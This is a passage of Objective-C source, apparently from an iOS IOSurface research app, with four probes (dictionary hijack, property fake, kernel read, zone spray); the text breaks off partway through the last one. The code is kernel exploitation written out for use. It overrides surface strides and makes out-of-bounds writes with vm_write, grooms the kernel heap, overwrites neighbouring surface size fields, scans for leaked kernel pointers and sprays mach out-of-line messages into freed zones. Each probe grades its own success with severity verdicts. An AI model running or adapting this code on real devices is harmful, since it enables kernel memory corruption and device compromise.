#pragma mark - Probe 58: Dict Hijack

void iosurface_research_dict_hijack(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"DICTHIJACK: Cannot load IOSurface symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
            if (!setValue || !copyValue) {
                log(@"DICTHIJACK: Missing IOSurfaceSetValue or IOSurfaceCopyValue");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"DICTHIJACK: Starting property dictionary hijack probe");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            IOSurfaceRef attacker = NULL;
            IOSurfaceRef targets[20] = {NULL};
            int targetCount = 0;

            // Step 1: Create attacker with BytesPerRow override
            if (!isr_stopped()) {
                log(@"DICTHIJACK: Step 1 — Create attacker surface with stride override");
                NSDictionary *atkProps = isr_default_surface_params(64, 64);
                attacker = sym.create((__bridge CFDictionaryRef)atkProps);
                if (attacker) {
                    setValue(attacker, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(65536));
                    setValue(attacker, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(65536 * 64));
                    sym.lock(attacker, 0, NULL);
                    void *atkBase = sym.getBase(attacker);
                    if (atkBase) {
                        memset(atkBase, 0, sym.getAllocSize(attacker));
                    }
                    sym.unlock(attacker, 0, NULL);
                    log(@"DICTHIJACK: Attacker created with BytesPerRow=65536");
                } else {
                    log(@"DICTHIJACK: Failed to create attacker");
                }

            // Step 2: Spray 20 target surfaces
            if (!isr_stopped()) {
                log(@"DICTHIJACK: Step 2 — Spray 20 target surfaces");
                for (int i = 0; i < 20 && !isr_stopped(); i++) {
                    NSDictionary *tProps = isr_default_surface_params(64, 64);
                    targets[i] = sym.create((__bridge CFDictionaryRef)tProps);
                    if (targets[i]) {
                        targetCount++;
                        setValue(targets[i], CFSTR("TestMarker"), (__bridge CFTypeRef)([NSString stringWithFormat:@"TARGET_%d", i]));
                        setValue(targets[i], CFSTR("TestValue"), (__bridge CFTypeRef)@(0xBEEF0000 + i));
                    }
                }
                log([NSString stringWithFormat:@"DICTHIJACK: Created %d target surfaces with marker properties", targetCount]);

            // Step 3: Write patterns via stride OOB into adjacent memory
            if (!isr_stopped()) {
                log(@"DICTHIJACK: Step 3 — Write corruption patterns via stride OOB");
                if (attacker) {
                    sym.lock(attacker, 0, NULL);
                    void *atkBase = sym.getBase(attacker);
                    size_t realAlloc = sym.getAllocSize(attacker);

                    uint32_t writePattern = 0xDEADC0DE;
                    size_t offsets[] = {realAlloc, realAlloc + 4096, realAlloc + 8192, realAlloc + 16384, realAlloc + 32768};
                    for (int o = 0; o < 5 && !isr_stopped(); o++) {
                        uint32_t buf[64];
                        for (int j = 0; j < 64; j++) buf[j] = writePattern + (uint32_t)(o * 64 + j);
                        kern_return_t kr = vm_write(mach_task_self(),
                            (vm_address_t)atkBase + offsets[o],
                            (vm_offset_t)buf, sizeof(buf));
                        if (kr == KERN_SUCCESS) {
                            log([NSString stringWithFormat:@"DICTHIJACK: OOB write at +0x%zx SUCCEEDED", offsets[o]]);
                            anomalies++;
                        }
                    }
                    sym.unlock(attacker, 0, NULL);
                }

            // Step 4: Check target surfaces for property corruption
            if (!isr_stopped()) {
                log(@"DICTHIJACK: Step 4 — Check targets for property corruption");
                for (int i = 0; i < 20 && !isr_stopped(); i++) {
                    if (!targets[i]) continue;

                    CFTypeRef markerVal = copyValue(targets[i], CFSTR("TestMarker"));
                    CFTypeRef numVal = copyValue(targets[i], CFSTR("TestValue"));
                    size_t curWidth = sym.getWidth(targets[i]);
                    size_t curHeight = sym.getHeight(targets[i]);
                    size_t curBPR = sym.getBytesPerRow(targets[i]);
                    size_t curAlloc = sym.getAllocSize(targets[i]);

                    BOOL corrupted = NO;
                    if (curWidth != 64) {
                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d width CORRUPTED: %zu (expected 64) ***", i, curWidth]);
                        anomalies++;
                        corrupted = YES;
                    }
                    if (curHeight != 64) {
                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d height CORRUPTED: %zu (expected 64) ***", i, curHeight]);
                        anomalies++;
                        corrupted = YES;
                    }
                    if (curBPR != 256) {
                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d BPR CORRUPTED: %zu (expected 256) ***", i, curBPR]);
                        anomalies++;
                        corrupted = YES;
                    }
                    if (curAlloc != 16384) {
                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d allocSize CORRUPTED: %zu (expected 16384) ***", i, curAlloc]);
                        anomalies++;
                        corrupted = YES;
                    }

                    if (markerVal == NULL) {
                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d TestMarker MISSING — dict corrupted ***", i]);
                        anomalies++;
                        corrupted = YES;
                    } else {
                        CFRelease(markerVal);
                    }

                    if (numVal) {
                        if (CFGetTypeID(numVal) == CFNumberGetTypeID()) {
                            int64_t val = 0;
                            CFNumberGetValue((CFNumberRef)numVal, kCFNumberSInt64Type, &val);
                            int64_t expected = 0xBEEF0000 + i;
                            if (val != expected) {
                                log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d TestValue CORRUPTED: 0x%llX (expected 0x%llX) ***", i, (unsigned long long)val, (unsigned long long)expected]);
                                anomalies++;
                                corrupted = YES;
                            }
                        }
                        CFRelease(numVal);
                    } else {
                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d TestValue MISSING ***", i]);
                        anomalies++;
                        corrupted = YES;
                    }

                    if (!corrupted && i < 3) {
                        log([NSString stringWithFormat:@"DICTHIJACK: Target %d properties intact", i]);
                    }
                }

            // Step 5: Cross-property pollution test
            if (!isr_stopped()) {
                log(@"DICTHIJACK: Step 5 — Cross-property pollution test");
                if (attacker) {
                    setValue(attacker, CFSTR("CrossPollute"), (__bridge CFTypeRef)@(0xC0FFEE42));
                }
                for (int i = 0; i < 20 && !isr_stopped(); i++) {
                    if (!targets[i]) continue;
                    CFTypeRef pollVal = copyValue(targets[i], CFSTR("CrossPollute"));
                    if (pollVal) {
                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d has CrossPollute property — CROSS POLLUTION ***", i]);
                        anomalies += 2;
                        CFRelease(pollVal);
                    }
                }

            } // end step 5
            } // end step 4
            } // end step 3
            } // end step 2
            } // end step 1

            for (int i = 0; i < 20; i++) {
                if (targets[i]) CFRelease(targets[i]);
            }
            if (attacker) CFRelease(attacker);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"DICTHIJACK: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (anomalies >= 8) verdict = @"CRITICAL — property dictionary corruption confirmed, cross-surface data flow";
            else if (anomalies >= 5) verdict = @"HIGH — OOB writes succeed, partial property corruption";
            else if (anomalies >= 3) verdict = @"MEDIUM — OOB writes succeed, no property corruption yet";
            else if (anomalies >= 1) verdict = @"LOW — limited OOB reach";
            else verdict = @"LOW — no OOB access";
            log([NSString stringWithFormat:@"DICTHIJACK: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-DictHijack-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 59: Prop Fake

void iosurface_research_prop_fake(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"PROPFAKE: Cannot load IOSurface symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
            typedef void (*RemoveValueFn)(IOSurfaceRef, CFStringRef);
            RemoveValueFn removeValue = (RemoveValueFn)dlsym(sym.iosurface, "IOSurfaceRemoveValue");
            if (!setValue || !copyValue) {
                log(@"PROPFAKE: Missing SetValue or CopyValue");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"PROPFAKE: Starting property fake probe — write patterns, check getter corruption");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            IOSurfaceRef attacker = NULL;
            IOSurfaceRef target = NULL;
            IOSurfaceRef fillers[30] = {NULL};
            int fillerCount = 0;

            // Step 1: Heap groom — spray fillers, free odd ones, create attacker+target
            if (!isr_stopped()) {
                log(@"PROPFAKE: Step 1 — Heap grooming for adjacency");
                for (int i = 0; i < 30 && !isr_stopped(); i++) {
                    NSDictionary *props = isr_default_surface_params(64, 64);
                    fillers[i] = sym.create((__bridge CFDictionaryRef)props);
                    if (fillers[i]) fillerCount++;
                }
                for (int i = 1; i < 30; i += 2) {
                    if (fillers[i]) { CFRelease(fillers[i]); fillers[i] = NULL; fillerCount--; }
                }

                NSDictionary *atkProps = isr_default_surface_params(64, 64);
                attacker = sym.create((__bridge CFDictionaryRef)atkProps);
                NSDictionary *tgtProps = isr_default_surface_params(64, 64);
                target = sym.create((__bridge CFDictionaryRef)tgtProps);

                if (attacker && target) {
                    setValue(attacker, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(65536));
                    setValue(attacker, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(65536 * 64));
                    setValue(target, CFSTR("KnownKey"), (__bridge CFTypeRef)@"ORIGINAL_VALUE");
                    setValue(target, CFSTR("KnownNum"), (__bridge CFTypeRef)@(12345678));
                    log(@"PROPFAKE: Attacker + target created, stride override applied");
                } else {
                    log(@"PROPFAKE: Failed to create attacker or target");
                }

            // Step 2: Write AAAA pattern via stride OOB at multiple offsets
            if (!isr_stopped()) {
                log(@"PROPFAKE: Step 2 — Write 0x4141414141414141 pattern via stride OOB");
                if (attacker) {
                    sym.lock(attacker, 0, NULL);
                    void *atkBase = sym.getBase(attacker);
                    size_t realAlloc = sym.getAllocSize(attacker);

                    uint64_t pattern = 0x4141414141414141ULL;
                    uint32_t writeSuccesses = 0;
                    for (size_t off = realAlloc; off < realAlloc + 65536; off += 4096) {
                        uint64_t buf[512];
                        for (int j = 0; j < 512; j++) buf[j] = pattern;
                        kern_return_t kr = vm_write(mach_task_self(),
                            (vm_address_t)atkBase + off,
                            (vm_offset_t)buf, sizeof(buf));
                        if (kr == KERN_SUCCESS) writeSuccesses++;
                    }
                    sym.unlock(attacker, 0, NULL);
                    log([NSString stringWithFormat:@"PROPFAKE: OOB write succeeded at %u/16 offsets", writeSuccesses]);
                    if (writeSuccesses > 0) anomalies++;
                }

            // Step 3: Read target properties via multiple APIs
            if (!isr_stopped()) {
                log(@"PROPFAKE: Step 3 — Check target surface getters for corruption");
                if (target) {
                    size_t tgtWidth = sym.getWidth(target);
                    size_t tgtHeight = sym.getHeight(target);
                    size_t tgtBPR = sym.getBytesPerRow(target);
                    size_t tgtAlloc = sym.getAllocSize(target);

                    log([NSString stringWithFormat:@"PROPFAKE: Target width=%zu height=%zu bpr=%zu alloc=%zu",
                         tgtWidth, tgtHeight, tgtBPR, tgtAlloc]);

                    if (tgtWidth == 0x41414141 || tgtHeight == 0x41414141) {
                        log(@"PROPFAKE: *** CRITICAL — getter returns our AAAA pattern! ***");
                        anomalies += 5;
                    }
                    if (tgtBPR == 0x4141414141414141ULL || tgtAlloc == 0x4141414141414141ULL) {
                        log(@"PROPFAKE: *** CRITICAL — size getter returns our AAAA pattern! ***");
                        anomalies += 5;
                    }
                    if (tgtWidth != 64) {
                        log([NSString stringWithFormat:@"PROPFAKE: *** Target width CHANGED: %zu ***", tgtWidth]);
                        anomalies++;
                    }
                    if (tgtHeight != 64) {
                        log([NSString stringWithFormat:@"PROPFAKE: *** Target height CHANGED: %zu ***", tgtHeight]);
                        anomalies++;
                    }
                    if (tgtBPR != 256) {
                        log([NSString stringWithFormat:@"PROPFAKE: *** Target BPR CHANGED: %zu ***", tgtBPR]);
                        anomalies++;
                    }

                    CFTypeRef knownStr = copyValue(target, CFSTR("KnownKey"));
                    if (knownStr) {
                        if (CFGetTypeID(knownStr) == CFStringGetTypeID()) {
                            NSString *s = (__bridge NSString *)knownStr;
                            if (![s isEqualToString:@"ORIGINAL_VALUE"]) {
                                log([NSString stringWithFormat:@"PROPFAKE: *** KnownKey CORRUPTED: %@ ***", s]);
                                anomalies += 3;
                            }
                        } else {
                            log(@"PROPFAKE: *** KnownKey type changed — dict corruption ***");
                            anomalies += 3;
                        }
                        CFRelease(knownStr);
                    } else {
                        log(@"PROPFAKE: *** KnownKey MISSING — dictionary destroyed ***");
                        anomalies += 2;
                    }

                    CFTypeRef knownNum = copyValue(target, CFSTR("KnownNum"));
                    if (knownNum) {
                        if (CFGetTypeID(knownNum) == CFNumberGetTypeID()) {
                            int64_t val = 0;
                            CFNumberGetValue((CFNumberRef)knownNum, kCFNumberSInt64Type, &val);
                            if (val != 12345678) {
                                log([NSString stringWithFormat:@"PROPFAKE: *** KnownNum CORRUPTED: %lld ***", (long long)val]);
                                anomalies += 3;
                            }
                        }
                        CFRelease(knownNum);
                    }
                }

            // Step 4: Read target backing memory for our AAAA pattern
            if (!isr_stopped()) {
                log(@"PROPFAKE: Step 4 — Check target backing for AAAA pattern leak");
                if (target) {
                    sym.lock(target, 0, NULL);
                    void *tgtBase = sym.getBase(target);
                    size_t tgtAlloc = sym.getAllocSize(target);
                    uint32_t patternHits = 0;
                    if (tgtBase && tgtAlloc > 0) {
                        uint32_t *words = (uint32_t *)tgtBase;
                        size_t wordCount = tgtAlloc / sizeof(uint32_t);
                        for (size_t j = 0; j < wordCount; j++) {
                            if (words[j] == 0x41414141) patternHits++;
                        }
                    }
                    sym.unlock(target, 0, NULL);
                    if (patternHits > 0) {
                        log([NSString stringWithFormat:@"PROPFAKE: *** %u AAAA pattern hits in target backing — OOB WRITE HIT TARGET ***", patternHits]);
                        anomalies += 2;
                    } else {
                        log(@"PROPFAKE: No AAAA pattern in target backing");
                    }
                }

            } // end step 4
            } // end step 3
            } // end step 2
            } // end step 1

            for (int i = 0; i < 30; i++) {
                if (fillers[i]) CFRelease(fillers[i]);
            }
            if (target) CFRelease(target);
            if (attacker) CFRelease(attacker);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"PROPFAKE: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (anomalies >= 8) verdict = @"CRITICAL — property getters return controlled data, kernel dict hijack confirmed";
            else if (anomalies >= 5) verdict = @"HIGH — OOB write reaches target, property corruption detected";
            else if (anomalies >= 3) verdict = @"MEDIUM — OOB writes succeed, target backing hit";
            else if (anomalies >= 1) verdict = @"LOW — OOB write works but no target corruption";
            else verdict = @"LOW — no OOB reach";
            log([NSString stringWithFormat:@"PROPFAKE: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-PropFake-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 60: Kernel Read

void iosurface_research_kernel_read(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"KREAD: Cannot load IOSurface symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
            if (!setValue || !copyValue) {
                log(@"KREAD: Missing SetValue or CopyValue");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"KREAD: Starting kernel read probe — locate metadata in OOB, expand surface");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            IOSurfaceRef attacker = NULL;
            IOSurfaceRef scanTarget = NULL;
            IOSurfaceRef fillers[50] = {NULL};
            int fillerCount = 0;
            uint32_t metadataOffset = 0;
            BOOL metadataFound = NO;

            // Step 1: Massive heap groom for adjacency
            if (!isr_stopped()) {
                log(@"KREAD: Step 1 — Heap groom: 50 fillers, free odd, create attacker+target");
                for (int i = 0; i < 50 && !isr_stopped(); i++) {
                    NSDictionary *props = isr_default_surface_params(64, 64);
                    fillers[i] = sym.create((__bridge CFDictionaryRef)props);
                    if (fillers[i]) fillerCount++;
                }
                for (int i = 1; i < 50; i += 2) {
                    if (fillers[i]) { CFRelease(fillers[i]); fillers[i] = NULL; fillerCount--; }
                }
                log([NSString stringWithFormat:@"KREAD: %d fillers remain after freeing odd indices", fillerCount]);

                NSDictionary *atkProps = isr_default_surface_params(64, 64);
                attacker = sym.create((__bridge CFDictionaryRef)atkProps);

                NSDictionary *tgtProps = isr_default_surface_params(64, 64);
                scanTarget = sym.create((__bridge CFDictionaryRef)tgtProps);

                if (attacker) {
                    setValue(attacker, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(65536));
                    setValue(attacker, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(65536 * 64));
                }
                if (attacker && scanTarget) {
                    log(@"KREAD: Attacker + scan target created");
                } else {
                    log(@"KREAD: Failed to create surfaces");
                }

            // Step 2: Scan OOB for target surface metadata signatures
            if (!isr_stopped()) {
                log(@"KREAD: Step 2 — Scan OOB for target metadata (width=64, height=64, bpr=256)");
                if (attacker) {
                    sym.lock(attacker, 0, NULL);
                    void *atkBase = sym.getBase(attacker);
                    size_t realAlloc = sym.getAllocSize(attacker);

                    uint32_t scanHits = 0;
                    for (size_t off = realAlloc; off < realAlloc + 262144 && !isr_stopped(); off += 8) {
                        uint64_t qwords[4] = {0};
                        vm_size_t readSz = 0;
                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
                            (vm_address_t)atkBase + off, sizeof(qwords),
                            (vm_address_t)qwords, &readSz);
                        if (kr != KERN_SUCCESS) continue;

                        for (int q = 0; q < 3; q++) {
                            uint32_t lo = (uint32_t)(qwords[q] & 0xFFFFFFFF);
                            uint32_t hi = (uint32_t)(qwords[q] >> 32);
                            uint32_t loNext = (uint32_t)(qwords[q+1] & 0xFFFFFFFF);

                            if ((lo == 64 && hi == 64) ||
                                (lo == 64 && loNext == 256) ||
                                (hi == 64 && loNext == 64)) {
                                uint32_t matchOff = (uint32_t)(off + q * 8);
                                log([NSString stringWithFormat:@"KREAD: *** Metadata signature at +0x%X: 0x%016llX 0x%016llX ***",
                                     matchOff, (unsigned long long)qwords[q], (unsigned long long)qwords[q+1]]);
                                anomalies++;
                                scanHits++;
                                if (!metadataFound) {
                                    metadataOffset = matchOff;
                                    metadataFound = YES;
                                }
                            }
                        }
                    }
                    sym.unlock(attacker, 0, NULL);
                    log([NSString stringWithFormat:@"KREAD: Found %u metadata signature hits", scanHits]);
                }

            // Step 3: If metadata found, try to overwrite size fields
            if (!isr_stopped()) {
                if (metadataFound) {
                    log([NSString stringWithFormat:@"KREAD: Step 3 — Overwrite size fields at +0x%X", metadataOffset]);
                    if (attacker) {
                        sym.lock(attacker, 0, NULL);
                        void *atkBase = sym.getBase(attacker);

                        uint64_t expandedSize = 1048576;
                        uint64_t expandedBPR = 65536;
                        kern_return_t kr1 = vm_write(mach_task_self(),
                            (vm_address_t)atkBase + metadataOffset,
                            (vm_offset_t)&expandedSize, 8);
                        kern_return_t kr2 = vm_write(mach_task_self(),
                            (vm_address_t)atkBase + metadataOffset + 8,
                            (vm_offset_t)&expandedBPR, 8);
                        sym.unlock(attacker, 0, NULL);

                        if (kr1 == KERN_SUCCESS || kr2 == KERN_SUCCESS) {
                            log(@"KREAD: *** OOB size field overwrite SUCCEEDED ***");
                            anomalies += 2;

                            size_t newAlloc = sym.getAllocSize(scanTarget);
                            size_t newBPR = sym.getBytesPerRow(scanTarget);
                            log([NSString stringWithFormat:@"KREAD: Target after overwrite: alloc=%zu bpr=%zu", newAlloc, newBPR]);
                            if (newAlloc != 16384 || newBPR != 256) {
                                log(@"KREAD: *** TARGET SIZE FIELDS CHANGED — METADATA OVERWRITE CONFIRMED ***");
                                anomalies += 5;
                            }
                        } else {
                            log(@"KREAD: Size field overwrite failed");
                        }
                    }
                } else {
                    log(@"KREAD: Step 3 — No metadata found, skipping overwrite");
                }

            // Step 4: Scan target's expanded memory for kernel pointers
            if (!isr_stopped()) {
                log(@"KREAD: Step 4 — Scan target memory for kernel pointer patterns");
                if (scanTarget) {
                    sym.lock(scanTarget, 0, NULL);
                    void *tgtBase = sym.getBase(scanTarget);
                    size_t tgtAlloc = sym.getAllocSize(scanTarget);
                    size_t scanSize = (tgtAlloc < 65536) ? tgtAlloc : 65536;

                    uint32_t kernPtrCount = 0;
                    uint32_t taggedCount = 0;
                    for (size_t off = 0; off < scanSize && !isr_stopped(); off += 8) {
                        uint64_t qword = 0;
                        vm_size_t readSz = 0;
                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
                            (vm_address_t)tgtBase + off, 8,
                            (vm_address_t)&qword, &readSz);
                        if (kr != KERN_SUCCESS) continue;
                        if (qword == 0) continue;

                        uint32_t top16 = (uint32_t)(qword >> 48);
                        if (top16 >= 0xFFFF && qword != 0xFFFFFFFFFFFFFFFFULL) {
                            kernPtrCount++;
                            if (kernPtrCount <= 5) {
                                log([NSString stringWithFormat:@"KREAD: *** KERNEL PTR at +0x%zx = 0x%016llX ***", off, (unsigned long long)qword]);
                            }
                        }
                        uint8_t topByte = (uint8_t)(qword >> 56);
                        if (topByte >= 0x80 && topByte <= 0xBF) {
                            taggedCount++;
                        }
                    }
                    sym.unlock(scanTarget, 0, NULL);

                    if (kernPtrCount > 0) {
                        log([NSString stringWithFormat:@"KREAD: *** Found %u kernel pointer candidates ***", kernPtrCount]);
                        anomalies += (kernPtrCount > 5) ? 5 : kernPtrCount;
                    }
                    if (taggedCount > 0) {
                        log([NSString stringWithFormat:@"KREAD: %u tagged pointer candidates found", taggedCount]);
                        anomalies++;
                    }
                    if (kernPtrCount == 0 && taggedCount == 0) {
                        log(@"KREAD: No kernel pointers found in scan range");
                    }
                }

            } // end step 4
            } // end step 3
            } // end step 2
            } // end step 1

            for (int i = 0; i < 50; i++) {
                if (fillers[i]) CFRelease(fillers[i]);
            }
            if (scanTarget) CFRelease(scanTarget);
            if (attacker) CFRelease(attacker);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"KREAD: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (anomalies >= 10) verdict = @"CRITICAL — kernel metadata overwritten, kernel pointers leaked via expanded surface";
            else if (anomalies >= 6) verdict = @"HIGH — metadata found and overwritten, size fields changed";
            else if (anomalies >= 3) verdict = @"MEDIUM — metadata signatures found in OOB";
            else if (anomalies >= 1) verdict = @"LOW — partial OOB scan";
            else verdict = @"LOW — no metadata found";
            log([NSString stringWithFormat:@"KREAD: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed),
                @"metadataFound": @(metadataFound),
                @"metadataOffset": [NSString stringWithFormat:@"0x%X", metadataOffset]
            };
            isr_checkpoint(@"ISR-KernelRead-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 61: Zone Spray

void iosurface_research_zone_spray(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"ZONESPRAY: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"ZONESPRAY: Starting kalloc zone spray — property-based zone overlap detection");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");

            #define ZS_COUNT 50
            IOSurfaceRef surfaces[ZS_COUNT];
            memset(surfaces, 0, sizeof(surfaces));
            int created = 0;
            int contaminated = 0;
            int oolSent = 0;

            if (!setValue || !copyValue) {
                log(@"ZONESPRAY: Missing SetValue/CopyValue");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            // Step 1: Create 50 surfaces with properties of varying sizes
            if (!isr_stopped()) {
                log(@"ZONESPRAY: Step 1 — Create 50 surfaces with sized properties");
                NSDictionary *params = isr_default_surface_params(32, 32);

                uint8_t patterns[] = {0xBB, 0xCC, 0xDD, 0xEE};
                size_t sizes[] = {64, 256, 1024, 4096};

                for (int i = 0; i < ZS_COUNT && !isr_stopped(); i++) {
                    surfaces[i] = sym.create((__bridge CFDictionaryRef)params);
                    if (!surfaces[i]) continue;
                    created++;

                    for (int s = 0; s < 4; s++) {
                        NSMutableData *blob = [NSMutableData dataWithLength:sizes[s]];
                        memset(blob.mutableBytes, patterns[s], sizes[s]);
                        NSString *key = [NSString stringWithFormat:@"ZS_%d_%d", i, s];
                        setValue(surfaces[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)blob);
                    }
                }
                log([NSString stringWithFormat:@"ZONESPRAY: Created %d surfaces with 4 properties each", created]);

            // Step 2: Free every other surface
            if (!isr_stopped()) {
                log(@"ZONESPRAY: Step 2 — Free odd-indexed surfaces");
                int freed = 0;
                for (int i = 1; i < ZS_COUNT; i += 2) {
                    if (surfaces[i]) {
                        CFRelease(surfaces[i]);
                        surfaces[i] = NULL;
                        freed++;
                    }
                }
                log([NSString stringWithFormat:@"ZONESPRAY: Freed %d surfaces", freed]);

            // Step 3: Spray mach messages with OOL data into freed holes
            if (!isr_stopped()) {
                log(@"ZONESPRAY: Step 3 — Spray mach OOL messages into freed zones");

                mach_port_t oolPorts[100];
                int oolCount = 0;

                for (int i = 0; i < 100 && !isr_stopped(); i++) {
                    mach_port_t port = MACH_PORT_NULL;
                    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
                    if (kr != KERN_SUCCESS) continue;
                    oolPorts[oolCount++] = port;

                    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

                    uint8_t oolData[256];
                    memset(oolData, 0xAA, sizeof(oolData));

                    typedef struct {
                        mach_msg_header_t header;
                        mach_msg_body_t body;
                        mach_msg_ool_descriptor_t ool;
                    } OOLMsg;

                    OOLMsg msg;
                    memset(&msg, 0, sizeof(msg));
                    msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                    msg.header.msgh_size = sizeof(msg);
                    msg.header.msgh_remote_port = port;
                    msg.header.msgh_local_port = MACH_PORT_NULL;
                    msg.body.msgh_descriptor_count = 1;
                    msg.ool.address = oolData;
                    msg.ool.size = sizeof(oolData);
                    msg.ool.deallocate = 0;
                    msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
                    msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;

                    kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
                    if (kr == KERN_SUCCESS) oolSent++;
                }
                log([NSString stringWithFormat:@"ZONESPRAY: Sent %d OOL messages", oolSent]);

            // Step 4: Check surviving surfaces for contamination
            if (!isr_stopped()) {
                log(@"ZONESPRAY: Step 4 — Check surviving surfaces for cross-contamination");

                for (int i = 0; i < ZS_COUNT; i += 2) {
                    if (!surfaces[i] || isr_stopped()) continue;

                    for (int s = 0; s < 4; s++) {
                        NSString *key = [NSString stringWithFormat:@"ZS_%d_%d", i, s];
                        CFTypeRef val = copyValue(surfaces[i], (__bridge CFStringRef)key);
                        if (val) {
